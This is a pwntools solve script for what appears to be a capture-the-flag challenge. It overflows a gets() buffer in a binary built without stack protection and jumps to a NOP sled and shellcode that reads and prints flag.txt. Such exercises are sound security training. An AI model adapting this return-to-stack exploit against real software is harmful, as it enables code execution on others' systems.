#!/usr/bin/env python3
# clearance: gets() overflow -> ret2stack
# build: gcc -fno-stack-protector -z execstack -no-pie -o clearance chall.c

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './clearance'
OFFSET = 408  # 400-byte buffer + saved rbp

SHELLCODE = asm('''
    lea rdi, [rip + flag]
    xor rsi, rsi
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall

    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

    xor rdi, rdi
    mov rax, 60
    syscall

    flag:
        .string "flag.txt"
''')

# gets() stops at newline, payload must not contain one
assert b'\n' not in SHELLCODE


def solve():
    p = process(BIN)

    p.recvuntil(b'Request ID: ')
    buf = int(p.recvline().strip(), 16)

    sled = buf + OFFSET + 8  # nop sled starts right after the overwritten rip
    log.info(f'buf: {hex(buf)}')
    log.info(f'rip -> {hex(sled)}')

    payload = flat(
        b'A' * OFFSET,
        p64(sled),
        b'\x90' * 64,
        SHELLCODE,
    )

    p.sendlineafter(b'Submit clearance request:', payload)
    print(p.recvall(timeout=2).decode(errors='ignore'))
    p.close()


if __name__ == '__main__':
    solve()
